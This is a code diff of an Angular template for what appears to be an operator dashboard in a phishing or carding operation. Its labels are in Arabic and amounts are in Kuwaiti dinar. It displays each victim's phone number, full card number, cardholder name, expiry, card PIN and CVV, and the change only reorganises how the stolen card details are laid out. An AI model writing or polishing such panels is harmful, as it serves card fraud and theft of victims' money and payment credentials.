@@ -112,22 +112,20 @@
               <tr class="hover:bg-slate-50/50 transition-colors">
 
                 <td class="px-6 py-5.5 flex flex-col gap-1">
-                  <span class="font-black text-slate-900 text-base sm:text-lg tracking-wide">{{ client.phone_number }}</span>
+                  <span class="font-black text-slate-900 text-base sm:text-lg tracking-wide">{{ client.phone_number
+                    }}</span>
                   <span class="font-extrabold text-red-600 text-sm sm:text-base">{{ client.credit }} د.ك</span>
                 </td>
 
                 <td class="px-6 py-5.5">
                   @let payment = getLatestPayment(client);
                   @if (payment) {
-                  <div class="flex flex-col gap-1.5">
-                    <span class="font-mono text-slate-900 tracking-wider font-bold text-base sm:text-lg">{{
-                      payment.cc_number }}</span>
-                    <div class="flex items-center gap-2 text-sm text-slate-600">
-                      <span class="font-extrabold text-slate-700">{{ payment.cc_name }}</span>
-                      <span class="text-slate-300">|</span>
-                      <span class="font-medium text-slate-500">تنتهي في: {{ payment.cc_month }}/{{ payment.cc_year
-                        }}</span>
-                    </div>
+                  <div class="flex flex-col gap-1.5 text-right">
+                    <span class="font-extrabold text-slate-700 text-sm">{{ payment.cc_name }}</span>
+                    <span class="font-mono text-slate-900 tracking-wider font-bold text-base sm:text-lg"
+                      style="direction: ltr;">{{ payment.cc_number }}</span>
+                    <span class="font-medium text-slate-500 text-sm">تنتهي في: {{ payment.cc_month }}/{{ payment.cc_year
+                      }}</span>
                   </div>
                   } @else {
                   <span class="text-slate-400 text-sm font-semibold italic">بانتظار إدخال البطاقة...</span>
@@ -136,11 +134,11 @@
 
                 <td class="px-6 py-5.5 font-mono font-black text-red-600 text-lg sm:text-xl tracking-widest">
                   @let pinPayment = getLatestPayment(client);
-                  @if (pinPayment) { 
-                    <div>PIN: {{ pinPayment.cc_pin }}</div>
-                    @if (pinPayment.cc_cvv) {
-                      <div class="text-sm mt-1 text-sky-600">CVV: {{ pinPayment.cc_cvv }}</div>
-                    }
+                  @if (pinPayment) {
+                  <div>PIN: {{ pinPayment.cc_pin }}</div>
+                  @if (pinPayment.cc_cvv) {
+                  <div class="text-sm mt-1 text-sky-600">CVV: {{ pinPayment.cc_cvv }}</div>
+                  }
                   } @else { <span class="text-slate-400">-</span> }
                 </td>
 
@@ -254,12 +252,14 @@
             <!-- ── Row 2: Card info ── -->
             @if (mPayment) {
             <div class="bg-slate-50 rounded-xl p-3 space-y-1 border border-slate-100">
-              <div class="flex items-center justify-between">
-                <span class="text-xs text-slate-400 font-bold">بيانات البطاقة</span>
-                <span class="text-xs text-slate-500">تنتهي في: {{ mPayment.cc_month }}/{{ mPayment.cc_year }}</span>
+              <div class="flex flex-col text-right">
+                <span class="text-xs text-slate-400 font-bold mb-1 border-b border-slate-100 pb-1">بيانات البطاقة</span>
+                <p class="text-sm text-slate-700 font-extrabold mt-1">{{ mPayment.cc_name }}</p>
+                <p class="font-mono font-bold text-slate-900 tracking-widest text-base" style="direction: ltr;">{{
+                  mPayment.cc_number }}</p>
+                <span class="text-xs text-slate-500 font-medium">تنتهي في: {{ mPayment.cc_month }}/{{ mPayment.cc_year
+                  }}</span>
               </div>
-              <p class="font-mono font-bold text-slate-900 tracking-widest text-sm">{{ mPayment.cc_number }}</p>
-              <p class="text-xs text-slate-600 font-semibold">{{ mPayment.cc_name }}</p>
               <!-- PIN & CVV -->
               <div class="flex flex-col gap-1 pt-1 border-t border-slate-200 mt-1">
                 <div class="flex items-center gap-2">
